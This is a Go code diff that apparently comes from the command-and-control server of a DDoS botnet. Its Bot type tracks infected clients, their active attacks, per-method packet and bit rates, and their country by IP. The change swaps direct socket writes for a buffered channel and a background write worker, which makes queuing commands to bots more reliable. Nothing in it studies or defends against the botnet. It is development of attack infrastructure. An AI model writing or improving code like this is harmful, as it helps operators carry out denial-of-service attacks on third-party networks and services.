@@ -20,6 +20,7 @@ type Bot struct {
     version     byte
     source      string
     writeMu     sync.Mutex
+    writeChan   chan []byte
     connectedAt time.Time
     statsMu     sync.RWMutex
     activeAttacks map[uint8]*AttackStats
@@ -35,11 +36,12 @@ func NewBot(conn net.Conn, version byte, source string) *Bot {
     country := getCountryByIP(ipStr)
     countryName := getCountryName(country)
     geoX, geoY := getCountryCoords(country)
-    return &Bot{
+    bot := &Bot{
         uid: -1,
         conn: conn,
         version: version,
         source: source,
+        writeChan: make(chan []byte, 256),
         connectedAt: time.Now(),
         activeAttacks: make(map[uint8]*AttackStats),
         country: country,
@@ -47,6 +49,8 @@ func NewBot(conn net.Conn, version byte, source string) *Bot {
         geoX: geoX,
         geoY: geoY,
     }
+    go bot.writeWorker()
+    return bot
 }
 func (this *Bot) UpdateStats(methodID uint8, pps uint64, bps uint64) {
     this.statsMu.Lock()
@@ -110,7 +114,10 @@ func (this *Bot) GetUptime() time.Duration {
 }
 func (this *Bot) Handle() {
     clientList.AddClient(this)
-    defer clientList.DelClient(this)
+    defer func() {
+        close(this.writeChan)
+        clientList.DelClient(this)
+    }()
     lenBuf := make([]byte, 2)
     for {
         this.conn.SetDeadline(time.Now().Add(180 * time.Second))
@@ -120,8 +127,9 @@ func (this *Bot) Handle() {
         }
         length := binary.BigEndian.Uint16(lenBuf)
         if length == 0 {
-            if _, err := this.conn.Write(lenBuf); err != nil {
-                return
+            select {
+            case this.writeChan <- lenBuf:
+            default:
             }
             continue
         }
@@ -162,15 +170,28 @@ func (this *Bot) Handle() {
                 continue
             }
         }
-        if _, err := this.conn.Write([]byte{0, 0}); err != nil {
+        select {
+        case this.writeChan <- []byte{0, 0}:
+        default:
+        }
+    }
+}
+
+func (this *Bot) writeWorker() {
+    for buf := range this.writeChan {
+        this.writeMu.Lock()
+        this.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+        _, err := this.conn.Write(buf)
+        this.writeMu.Unlock()
+        if err != nil {
             return
         }
     }
 }
+
 func (this *Bot) QueueBuf(buf []byte) {
-    this.writeMu.Lock()
-    defer this.writeMu.Unlock()
-    if _, err := this.conn.Write(buf); err != nil {
-        return
+    select {
+    case this.writeChan <- buf:
+    default:
     }
 }
